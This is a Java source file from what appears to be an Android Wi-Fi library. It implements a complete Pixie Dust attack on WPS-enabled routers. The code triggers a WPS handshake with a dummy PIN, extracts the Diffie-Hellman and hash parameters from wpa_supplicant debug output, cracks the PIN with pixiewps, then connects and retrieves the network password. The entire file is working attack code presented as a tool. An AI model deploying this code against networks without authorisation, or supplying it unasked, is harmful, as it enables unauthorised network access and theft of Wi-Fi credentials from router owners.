package sangiorgi.wps.lib.services;

import android.content.Context;
import android.os.SystemClock;
import android.util.Log;
import java.util.concurrent.CompletableFuture;
import java.util.concurrent.TimeUnit;
import sangiorgi.wps.lib.ndk.WpsConfig;
import sangiorgi.wps.lib.ndk.WpsNative;

/**
 * Executor for Pixie Dust attack workflow using NDK native code.
 * 1. Starts wpa_supplicant with debug mode and sends WPS_REG with dummy PIN
 * 2. Extracts 6 PixieDust hex parameters from wpa_supplicant debug output (native)
 * 3. Computes PIN via pixiewps (native, no root needed)
 * 4. If PIN found, attempts WPS connection with discovered PIN
 */
public class PixieDustExecutor {
  private static final String TAG = "PixieDustExecutor";

  private final Context context;
  private final WpsExecutor sharedExecutor;

  public PixieDustExecutor(Context context, WpsExecutor sharedExecutor) {
    this.context = context;
    this.sharedExecutor = sharedExecutor;
  }

  /** Execute complete Pixie Dust attack workflow */
  public CompletableFuture<PixieDustResult> executePixieDust(String bssid) {
    return CompletableFuture.supplyAsync(
        () -> {
          Log.i(TAG, "Starting Pixie Dust attack on BSSID: " + bssid);

          WpsNative wpsNative = sharedExecutor.getWpsNative();
          if (!wpsNative.isAvailable()) {
            return new PixieDustResult(false, bssid, null, null,
                "Native library not available");
          }

          String confPath = WpsConfig.ensureConfigFile(context);
          if (confPath == null) {
            return new PixieDustResult(false, bssid, null, null,
                "Failed to create wpa_supplicant config file");
          }
          String ctrlDir = WpsNative.getCtrlDir();

          // Start wpa_supplicant in debug mode for parameter extraction
          long handle = wpsNative.startWpaSupplicant("wlan0", confPath, ctrlDir, true);
          if (handle == 0) {
            return new PixieDustResult(false, bssid, null, null,
                "Failed to start wpa_supplicant");
          }

          try {
            // Wait for wpa_supplicant to initialize
            SystemClock.sleep(2000);

            // Send WPS_REG with dummy PIN to trigger handshake
            wpsNative.wpsReg(bssid, "12345670");

            // Extract Pixie Dust parameters from wpa_supplicant debug output
            // Needs enough time for: scan + association + EAP-WSC M1/M2 exchange
            String[] params = wpsNative.extractPixieDustParams(handle, 20000);

            if (params == null || params.length != 6) {
              Log.e(TAG, "Failed to extract Pixie Dust parameters");
              return new PixieDustResult(false, bssid, null, null,
                  "Failed to extract Pixie Dust parameters. Router may not be vulnerable.");
            }

            Log.d(TAG, "Extracted params: enonce=" + params[0] +
                " pkr(DH own)=" + params[1] + " pke(DH peer)=" + params[2] +
                " authkey=" + params[3] + " ehash1=" + params[4] +
                " ehash2=" + params[5]);

            // Compute PIN via pixiewps (no root needed)
            // In WPS_REG mode, wpa_supplicant is External Registrar:
            //   "DH peer Public Key" = AP's key = PKE (Enrollee)
            //   "DH own Public Key"  = our key  = PKR (Registrar)
            String pin = wpsNative.computePixiePin(
                params[2], // pke = DH peer Public Key (AP/Enrollee)
                params[1], // pkr = DH own Public Key (us/Registrar)
                params[4], // eHash1
                params[5], // eHash2
                params[3], // authKey
                params[0], // eNonce (Enrollee Nonce)
                true       // --force: bruteforce full range
            );

            if (pin == null) {
              Log.d(TAG, "PIN not found");
              return new PixieDustResult(false, bssid, null, null,
                  "PIN not found. Router is not vulnerable to Pixie Dust attack.");
            }

            Log.i(TAG, "PIN found: " + pin);

            // Stop the debug session before attempting connection with found PIN
            wpsNative.stopWpaSupplicant(handle);
            handle = 0; // Prevent double-stop in finally

            // Attempt WPS connection with discovered PIN
            WpsResult wpsResult = attemptWpsConnection(bssid, pin);

            if (wpsResult != null && wpsResult.isSuccess()) {
              return new PixieDustResult(true, bssid, pin, wpsResult,
                  "Successfully connected with PIN: " + pin);
            } else {
              return new PixieDustResult(false, bssid, pin, wpsResult,
                  "PIN found (" + pin + ") but WPS connection failed");
            }

          } finally {
            if (handle != 0) {
              wpsNative.stopWpaSupplicant(handle);
            }
          }
        });
  }

  /** Attempt WPS connection with discovered PIN using the shared executor. */
  private WpsResult attemptWpsConnection(String bssid, String pin) {
    try {
      Log.i(TAG, "Attempting WPS connection with PIN: " + pin);

      WpsResult result = sharedExecutor.executeWpsConnection(bssid, pin).get(30, TimeUnit.SECONDS);

      if (result != null && result.isSuccess()) {
        Log.i(TAG, "WPS connection successful with PIN: " + pin);
      } else {
        Log.w(TAG, "WPS connection failed with PIN: " + pin);
      }

      return result;

    } catch (Exception e) {
      Log.e(TAG, "Error attempting WPS connection with discovered PIN", e);
      return null;
    }
  }

  /** Result of Pixie Dust attack */
  public static class PixieDustResult {
    private final boolean success;
    private final String bssid;
    private final String pin;
    private final WpsResult wpsResult;
    private final String message;

    public PixieDustResult(
        boolean success, String bssid, String pin, WpsResult wpsResult, String message) {
      this.success = success;
      this.bssid = bssid;
      this.pin = pin;
      this.wpsResult = wpsResult;
      this.message = message;
    }

    public boolean isSuccess() {
      return success;
    }

    public String getBssid() {
      return bssid;
    }

    public String getPin() {
      return pin;
    }

    public WpsResult getWpsResult() {
      return wpsResult;
    }

    public String getMessage() {
      return message;
    }

    public String getPassword() {
      if (wpsResult != null && wpsResult.getPassword() != null) {
        return wpsResult.getPassword();
      }
      return null;
    }
  }
}
